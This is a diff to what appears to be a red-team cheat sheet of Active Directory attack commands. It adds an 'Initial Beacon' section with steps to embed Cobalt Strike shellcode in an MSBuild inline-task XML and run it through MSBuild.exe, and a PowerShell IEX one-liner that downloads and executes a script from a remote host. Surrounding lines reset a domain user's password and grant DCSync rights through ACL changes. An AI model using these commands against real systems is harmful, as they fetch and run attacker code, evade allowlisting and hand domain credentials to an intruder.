@@ -49,6 +49,13 @@ PowerView
   Change User PW: powerpick $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity <username> -AccountPassword $newpwd
   Change ACL Perms: Add-DomainObjectAcl -TargetIdentity <domain|user|computer> -PrincipalIdentity <user|computer> -Rights <DCSync|All> -Verbose
 
+Initial Beacon
+  MSBuild:
+    Download XML from: https://github.com/3gstudent/msbuild-inline-task
+    Generate Shellcode from Cobalt (C#) and place the shellcode in the XML from new_byte...};
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
+  Powershell IEX
+    "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
 
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
